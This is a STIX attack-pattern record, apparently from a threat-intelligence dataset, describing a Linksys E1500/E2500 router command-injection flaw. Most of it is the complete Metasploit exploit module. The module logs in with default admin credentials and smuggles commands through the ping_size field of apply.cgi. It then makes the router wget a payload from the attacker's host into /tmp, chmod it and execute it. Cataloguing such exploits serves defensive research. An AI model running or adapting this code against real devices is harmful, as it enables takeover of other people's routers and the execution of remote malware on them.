{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c37c263d-cd20-4510-854e-064a18de6a3c",
    "created": "2024-08-14T17:00:19.257609Z",
    "modified": "2024-08-14T17:00:19.257613Z",
    "name": "Linksys E1500/E2500 apply.cgi Remote Command Injection",
    "description": " Some Linksys Routers are vulnerable to an authenticated OS command injection. Default credentials for the web interface are admin/admin or admin/password. Since it is a blind os command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linksys_e1500_apply_exec.rb",
            "external_id": "linksys_e1500_apply_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-004"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Linksys E1500/E2500 apply.cgi Remote Command Injection',\n      'Description' => %q{\n          Some Linksys Routers are vulnerable to an authenticated OS command injection.\n        Default credentials for the web interface are admin/admin or admin/password. Since\n        it is a blind os command injection vulnerability, there is no output for the\n        executed command when using the cmd generic payload. A ping command against a\n        controlled system could be used for testing purposes.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'BID', '57760' ],\n          [ 'EDB', '24475' ],\n          [ 'OSVDB', '89912' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ]\n        ],\n      'DisclosureDate' => '2013-02-05',\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix },\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'CMD',\n            {\n            'Arch' => ARCH_CMD,\n            'Platform' => 'unix'\n            }\n          ],\n          [ 'Linux mipsel Payload',\n            {\n            'Arch' => ARCH_MIPSLE,\n            'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DefaultTarget'  => 1\n      ))\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'The username to authenticate as', 'admin' ]),\n        OptString.new('HttpPassword', [ true, 'The password for the specified username', 'admin' ]),\n        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),\n        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])\n      ])\n  end\n\n\n  def request(cmd,user,pass,uri)\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'POST',\n        'authorization' => basic_auth(user,pass),\n        'vars_post' => {\n          \"submit_button\" => \"Diagnostics\",\n          \"change_action\" => \"gozila_cgi\",\n          \"submit_type\" => \"start_ping\",\n          \"action\" => \"\",\n          \"commit\" => \"0\",\n          \"ping_ip\" => \"1.1.1.1\",\n          \"ping_size\" => \"&#{cmd}&\",\n          \"ping_times\" => \"5\",\n          \"traceroute_ip\" => \"\"\n        }\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return nil\n    end\n  end\n\n  def exploit\n    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))\n    uri = '/apply.cgi'\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword']\n    rhost = datastore['RHOST']\n    rport = datastore['RPORT']\n\n    #\n    # testing Login\n    #\n    print_status(\"#{rhost}:#{rport} - Trying to login with #{user} / #{pass}\")\n    begin\n      res = send_request_cgi({\n        'uri'     => uri,\n        'method'  => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n      if res.nil? or res.code == 404\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n      if [200, 301, 302].include?(res.code)\n        print_good(\"#{rhost}:#{rport} - Successful login #{user}/#{pass}\")\n      else\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Failed to connect to the web server\")\n    end\n\n    if target.name =~ /CMD/\n      if not (datastore['CMD'])\n        fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - Only the cmd/generic payload is compatible\")\n      end\n      cmd = payload.encoded\n      res = request(cmd,user,pass,uri)\n      if (!res)\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n      else\n        print_status(\"#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\")\n      end\n      return\n    end\n\n    #thx to Juan for his awesome work on the mipsel elf support\n    @pl = generate_payload_exe\n    @elf_sent = false\n\n    #\n    # start our server\n    #\n    resource_uri = '/' + downfile\n\n    if (datastore['DOWNHOST'])\n      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri\n    else\n      #do not use SSL\n      if datastore['SSL']\n        ssl_restore = true\n        datastore['SSL'] = false\n      end\n\n      #we use SRVHOST as download IP for the coming wget command.\n      #SRVHOST needs a real IP address of our download host\n      if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n        srv_host = Rex::Socket.source_address(rhost)\n      else\n        srv_host = datastore['SRVHOST']\n      end\n\n      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri\n      print_status(\"#{rhost}:#{rport} - Starting up our web service on #{service_url} ...\")\n      start_service({'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }})\n\n      datastore['SSL'] = true if ssl_restore\n    end\n\n    #\n    # download payload\n    #\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to download #{service_url}\")\n    #this filename is used to store the payload on the device\n    filename = rand_text_alpha_lower(8)\n\n    #not working if we send all command together -> lets take three requests\n    cmd = \"/usr/bin/wget #{service_url} -O /tmp/#{filename}\"\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n    # wait for payload download\n    if (datastore['DOWNHOST'])\n      print_status(\"#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the Linksys device to download the payload\")\n      select(nil, nil, nil, datastore['HTTP_DELAY'])\n    else\n      wait_linux_payload\n    end\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n\n    #\n    # chmod\n    #\n    cmd = \"chmod 777 /tmp/#{filename}\"\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to chmod #{downfile}\")\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n    #\n    # execute\n    #\n    cmd = \"/tmp/#{filename}\"\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to execute #{downfile}\")\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    #print_status(\"on_request_uri called: #{request.inspect}\")\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status(\"#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...\")\n\n    waited = 0\n    while (not @elf_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-05",
    "x_mitre_platforms": [
        "linux"
    ]
}